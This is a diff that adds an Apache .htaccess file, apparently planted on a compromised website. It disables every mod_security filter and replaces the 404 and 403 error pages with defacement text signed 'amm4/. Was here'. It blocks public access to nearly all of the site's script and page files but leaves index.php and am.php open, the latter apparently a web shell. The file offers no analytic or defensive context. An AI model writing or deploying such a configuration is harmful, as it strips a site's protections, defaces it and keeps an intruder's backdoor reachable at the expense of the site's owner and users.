@@ -1,0 +1,21 @@
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+SecFilterCheckURLEncoding Off
+SecFilterCheckCookieFormat Off
+SecFilterCheckUnicodeEncoding Off
+SecFilterNormalizeCookies Off
+</IfModule>
+
+ErrorDocument 404 "<html><head><title>404 No Found</title></html></head><body><h1>Not Found</h1>the document does not exist.<p></p><hr><address>amm4/. Was here</address> </body></html>"
+
+ErrorDocument 403 "<html><head><title>403 Forbidden</title></html></head><body><h1>Forbidden</h1>You do not have permission to access this document.<p></p><hr><address>amm4/. Was here :p :v </address> </body></html>" 
+
+<FilesMatch "\.(php|php4|php5|txt|htm|html|shtml|phtml|css|js|asp|pl|cgi)$">
+Deny from All
+Allow from 127.0.0.1
+</FilesMatch>
+
+<FilesMatch "(index.php|am.php)$">
+Allow from All
+</FilesMatch>
